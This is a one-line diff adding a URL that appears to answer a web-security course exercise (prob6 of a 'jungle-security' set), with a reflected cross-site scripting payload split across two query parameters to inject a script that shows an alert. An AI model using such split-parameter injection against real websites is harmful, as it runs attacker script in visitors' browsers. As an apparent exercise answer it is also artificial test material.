@@ -1,0 +1,1 @@
+Visit the URL http://cliu2014.scripts.mit.edu/6470-jungle-security/prob6/index.php?a=%3Cscript%3Evoid('&b=');alert('hello world');%3C/script%3E
